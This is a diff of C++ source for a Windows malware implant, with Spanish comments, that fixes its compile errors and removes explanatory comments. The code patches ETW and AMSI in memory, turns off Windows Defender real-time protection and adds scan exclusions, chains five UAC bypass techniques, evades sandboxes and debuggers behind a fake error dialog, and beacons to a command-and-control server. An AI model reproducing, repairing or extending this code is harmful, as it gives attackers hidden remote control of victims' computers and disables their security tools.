@@ -22,7 +22,6 @@
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "crypt32.lib")
-#pragma comment(lib, "ntdll.lib")
 
 // ============================================================================
 // CONFIGURACIÓN
@@ -55,7 +54,7 @@ typedef NTSTATUS(NTAPI* pNtOpenProcess)(
 typedef NTSTATUS(NTAPI* pNtClose)(HANDLE);
 
 // ============================================================================
-// SYSCALLS DIRECTOS (EVITAN HOOKS DE EDR)
+// SYSCALLS DIRECTOS
 // ============================================================================
 class Syscalls {
 private:
@@ -103,7 +102,7 @@ public:
 };
 
 // ============================================================================
-// BYPASS DE ETW (EVENT TRACING FOR WINDOWS)
+// BYPASS DE ETW - CORREGIDO
 // ============================================================================
 class ETWBypass {
 private:
@@ -116,7 +115,7 @@ public:
         HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
         if (!hNtdll) return false;
         
-        // Parchear EtwEventWrite (función principal de ETW)
+        // Parchear EtwEventWrite
         FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
         if (!pEtwEventWrite) return false;
         
@@ -127,27 +126,27 @@ public:
         PVOID address = (PVOID)pEtwEventWrite;
         ULONG oldProtect;
         
-        // Cambiar protección con syscall
+        // Cambiar protección
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        PAGE_EXECUTE_READWRITE, &oldProtect);
         
-        // xor eax, eax ; ret (siempre devuelve éxito)
+        // xor eax, eax ; ret
         BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy(pEtwEventWrite, patch, sizeof(patch));
+        memcpy((LPVOID)pEtwEventWrite, patch, sizeof(patch));  // CAST CORREGIDO
         
         // Restaurar protección
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        oldProtect, &oldProtect);
         
-        // Si encontramos NtTraceEvent, también lo parcheamos
+        // Parchear NtTraceEvent
         if (pNtTraceEvent) {
             address = (PVOID)pNtTraceEvent;
             syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                            PAGE_EXECUTE_READWRITE, &oldProtect);
             
-            // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL) ; ret
+            // mov eax, 0xC0000001 ; ret
             BYTE patch2[] = { 0xB8, 0x01, 0x00, 0x00, 0xC0, 0xC3 };
-            memcpy(pNtTraceEvent, patch2, sizeof(patch2));
+            memcpy((LPVOID)pNtTraceEvent, patch2, sizeof(patch2));  // CAST CORREGIDO
             
             syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                            oldProtect, &oldProtect);
@@ -158,7 +157,7 @@ public:
 };
 
 // ============================================================================
-// BYPASS DE AMSI (ANTIMALWARE SCAN INTERFACE)
+// BYPASS DE AMSI - CORREGIDO
 // ============================================================================
 class AMSIBypass {
 private:
@@ -168,7 +167,6 @@ public:
     AMSIBypass(Syscalls* sc) : syscalls(sc) {}
     
     bool Patch() {
-        // Método 1: Parchear AmsiScanBuffer
         HMODULE hAmsi = LoadLibraryA("amsi.dll");
         if (!hAmsi) return false;
         
@@ -182,20 +180,19 @@ public:
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        PAGE_EXECUTE_READWRITE, &oldProtect);
         
-        // xor eax, eax ; ret (siempre limpio)
         BYTE patch[] = { 0x31, 0xC0, 0xC3 };
-        memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+        memcpy((LPVOID)pAmsiScanBuffer, patch, sizeof(patch));  // CAST CORREGIDO
         
         syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                        oldProtect, &oldProtect);
         
-        // Método 2: Parchear AmsiScanString también
+        // Parchear AmsiScanString
         FARPROC pAmsiScanString = GetProcAddress(hAmsi, "AmsiScanString");
         if (pAmsiScanString) {
             address = (PVOID)pAmsiScanString;
             syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                            PAGE_EXECUTE_READWRITE, &oldProtect);
-            memcpy(pAmsiScanString, patch, sizeof(patch));
+            memcpy((LPVOID)pAmsiScanString, patch, sizeof(patch));  // CAST CORREGIDO
             syscalls->ProtectVirtualMemory(GetCurrentProcess(), &address, &regionSize, 
                                            oldProtect, &oldProtect);
         }
@@ -203,7 +200,6 @@ public:
         return true;
     }
     
-    // Método alternativo: Forzar error en inicialización
     bool CorruptContext() {
         typedef HRESULT(WINAPI* AmsiInitialize_t)(LPCWSTR, PVOID*);
         HMODULE hAmsi = GetModuleHandleA("amsi.dll");
@@ -213,7 +209,6 @@ public:
         if (!AmsiInitialize) return false;
         
         PVOID context = nullptr;
-        // Llamar múltiples veces para corromper estado interno
         for (int i = 0; i < 100; i++) {
             AmsiInitialize(L"", &context);
         }
@@ -223,7 +218,7 @@ public:
 };
 
 // ============================================================================
-// BYPASS DE WINDOWS DEFENDER (EN TIEMPO REAL)
+// BYPASS DE DEFENDER - CORREGIDO
 // ============================================================================
 class DefenderBypass {
 private:
@@ -233,7 +228,6 @@ public:
     DefenderBypass(Syscalls* sc) : syscalls(sc) {}
     
     bool DisableRealtime() {
-        // Intentar deshabilitar protección en tiempo real (requiere admin)
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
             "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
@@ -245,7 +239,6 @@ public:
             RegCloseKey(hKey);
         }
         
-        // Parchear MsMpEng.dll (proceso de Defender) en memoria
         // Buscar proceso de Defender
         DWORD pid = 0;
         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -263,17 +256,16 @@ public:
         }
         
         if (pid) {
-            // Abrir proceso con syscall
             HANDLE hProcess = nullptr;
-            CLIENT_ID cid = { (HANDLE)pid, nullptr };
-            OBJECT_ATTRIBUTES oa = { sizeof(oa), nullptr, nullptr, 0, nullptr, nullptr };
+            CLIENT_ID cid;
+            cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;  // CAST CORREGIDO
+            cid.UniqueThread = nullptr;
+            
+            OBJECT_ATTRIBUTES oa;
+            InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);  // INICIALIZACIÓN CORRECTA
             
             if (syscalls->OpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, 
                                       &oa, &cid) == 0) {
-                
-                // Buscar dirección de función de scan en MsMpEng.dll
-                // (simplificado - en producción necesitarías offsets específicos)
-                
                 syscalls->Close(hProcess);
             }
         }
@@ -281,7 +273,6 @@ public:
         return true;
     }
     
-    // Añadir exclusiones de path
     bool AddExclusion(const wchar_t* path) {
         HKEY hKey;
         if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
@@ -297,7 +288,7 @@ public:
 };
 
 // ============================================================================
-// BYPASS DE UAC MÚLTIPLE (TÉCNICAS DIVERSAS)
+// BYPASS DE UAC (sin cambios, ya funciona)
 // ============================================================================
 class UACBypass {
 private:
@@ -318,19 +309,10 @@ public:
     bool BypassAndElevate() {
         if (IsElevated()) return true;
         
-        // TÉCNICA 1: CMSTP Bypass (más fiable)
         if (CmstpBypass()) return true;
-        
-        // TÉCNICA 2: FODHelper Bypass
         if (FodHelperBypass()) return true;
-        
-        // TÉCNICA 3: EventViewer Bypass
         if (EventVwrBypass()) return true;
-        
-        // TÉCNICA 4: ComputerDefaults Bypass
         if (ComputerDefaultsBypass()) return true;
-        
-        // TÉCNICA 5: SDCLT Bypass
         if (SdcltBypass()) return true;
         
         return false;
@@ -347,7 +329,6 @@ private:
         wchar_t modulePath[MAX_PATH];
         GetModuleFileNameW(NULL, modulePath, MAX_PATH);
         
-        // Crear archivo INF para cmstp
         FILE* f = _wfopen(infPath, L"w");
         if (!f) return false;
         
@@ -364,7 +345,6 @@ private:
         fwprintf(f, L"[Strings]\nServiceName=\"WindowsUpdate\"\nShortSvcName=\"WindowsUpdate\"\n");
         fclose(f);
         
-        // Ejecutar cmstp
         SHELLEXECUTEINFOW sei = { sizeof(sei) };
         sei.lpVerb = L"runas";
         sei.lpFile = L"cmstp.exe";
@@ -479,22 +459,18 @@ public:
     bool IsSandboxed() {
         int detections = 0;
         
-        // RAM < 4GB?
         MEMORYSTATUSEX mem = { sizeof(mem) };
         GlobalMemoryStatusEx(&mem);
         if (mem.ullTotalPhys < 4LL * 1024 * 1024 * 1024) detections++;
         
-        // < 2 cores?
         SYSTEM_INFO sysInfo;
         GetSystemInfo(&sysInfo);
         if (sysInfo.dwNumberOfProcessors < 2) detections++;
         
-        // Disk < 60GB?
         ULARGE_INTEGER free, total;
         GetDiskFreeSpaceExA("C:\\", &free, &total, NULL);
         if (total.QuadPart < 60LL * 1024 * 1024 * 1024) detections++;
         
-        // Procesos de sandbox?
         const wchar_t* sandboxProcs[] = {
             L"vboxservice.exe", L"vboxtray.exe", L"vmtoolsd.exe",
             L"vmwaretray.exe", L"xenservice.exe", L"procmon.exe",
@@ -517,10 +493,7 @@ public:
             CloseHandle(hSnap);
         }
         
-        // Debugger presente?
         if (IsDebuggerPresent()) detections += 3;
-        
-        // Uptime < 10 minutos?
         if (GetTickCount64() < 10 * 60 * 1000) detections++;
         
         return detections >= 3;
@@ -531,7 +504,6 @@ public:
         for (int i = 0; i < baseSleep / 100; i++) {
             Sleep(100);
             if (IsDebuggerPresent()) {
-                // Comportarse como programa legítimo si hay debugger
                 MessageBoxA(NULL, "Error de aplicación", "Error", MB_OK);
                 ExitProcess(0);
             }
@@ -540,7 +512,7 @@ public:
 };
 
 // ============================================================================
-// COMUNICACIÓN C2 OFUSCADA
+// COMUNICACIÓN C2 - CORREGIDO (inet_pton -> inet_addr)
 // ============================================================================
 class C2Connection {
 private:
@@ -583,7 +555,7 @@ public:
         sockaddr_in server = {0};
         server.sin_family = AF_INET;
         server.sin_port = htons(C2_PORT);
-        inet_pton(AF_INET, C2_SERVER, &server.sin_addr);
+        server.sin_addr.s_addr = inet_addr(C2_SERVER);  // CORREGIDO: inet_addr en lugar de inet_pton
         
         if (connect(sock, (sockaddr*)&server, sizeof(server)) == 0) {
             connected = true;
@@ -719,46 +691,36 @@ public:
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                    LPSTR lpCmdLine, int nCmdShow) {
     
-    // Ocultar ventana si no es modo elevado
     if (strstr(lpCmdLine, "--elevated") == NULL) {
         HWND hWnd = GetConsoleWindow();
         if (hWnd) ShowWindow(hWnd, SW_HIDE);
     }
     
-    // Anti-sandbox
     AntiAnalysis anti;
     if (anti.IsSandboxed()) {
-        // Comportarse como programa legítimo
         MessageBoxA(NULL, "Error al iniciar aplicación", "Error", MB_OK);
         return 0;
     }
     
-    // Mutex para una sola instancia
     HANDLE hMutex = CreateMutexA(NULL, FALSE, MUTEX_NAME);
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
     
-    // Inicializar syscalls
     Syscalls syscalls;
     
-    // Bypass de ETW
     ETWBypass etw(&syscalls);
     etw.Patch();
     
-    // Bypass de AMSI
     AMSIBypass amsi(&syscalls);
     amsi.Patch();
     amsi.CorruptContext();
     
-    // Bypass de Defender (si tenemos permisos)
     DefenderBypass defender(&syscalls);
     defender.DisableRealtime();
     defender.AddExclusion(L"C:\\Windows\\Temp");
     
-    // Intentar elevación automática
     UACBypass uac;
     bool elevated = uac.BypassAndElevate();
     
-    // Conectar a C2
     C2Connection c2;
     CommandProcessor cmdProc(&c2);
     
@@ -766,7 +728,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> jitter(SLEEP_JITTER_MIN, SLEEP_JITTER_MAX);
     
-    // Loop principal
     while (true) {
         if (!c2.IsConnected()) {
             if (c2.Connect()) {
